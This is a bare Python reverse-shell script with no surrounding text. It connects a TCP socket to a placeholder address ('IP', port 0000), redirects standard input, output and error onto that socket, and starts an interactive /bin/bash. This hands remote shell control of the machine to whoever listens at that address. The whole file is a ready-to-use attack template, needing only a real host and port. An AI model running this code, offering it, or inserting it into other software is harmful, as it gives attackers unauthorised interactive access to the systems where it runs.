import socket
import subprocess
import os


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# IP  and PORT
s.connect(("IP", 0000))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/bash", "-i"])